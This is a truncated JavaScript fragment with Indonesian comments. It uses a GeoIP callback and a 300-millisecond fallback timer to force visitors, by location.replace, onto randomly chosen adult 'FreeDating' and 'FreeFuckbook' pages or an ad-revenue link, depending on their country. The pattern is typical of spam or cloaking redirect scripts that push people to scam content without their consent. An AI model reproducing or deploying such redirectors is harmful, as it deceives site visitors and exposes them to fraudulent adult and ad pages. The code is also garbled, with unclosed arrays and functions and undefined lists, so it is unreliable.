        "NZ",

      ];

      const targetUrls = [
        "https://mhn.whtstrmx.my.id/FreeDating/",
        "https://mhn.whtstrmx.my.id/FreeFuckbook/",
        "https://mhn.whtstrmx.my.id/FreeVideos/",

        "https://www.profitableratecpm.com/hn0e93zd?key=75687488970783f8df4342427a1ba3eb",

      // Pilih URL acak
      const randomUrl = (list) => list[Math.floor(Math.random() * list.length)];

      // Redirect fallback jika geoip lambat/gagal (300ms)
      const fallback = setTimeout(() => {
        location.replace(randomUrl(fallbackUrls));

      // GeoIP callback
      function geoip(r) {
        clearTimeout(fallback);
        const url = targetCountries.includes(r.country)
          ? randomUrl(targetUrls)
          : randomUrl(fallbackUrls);
        location.replace(url);
      }
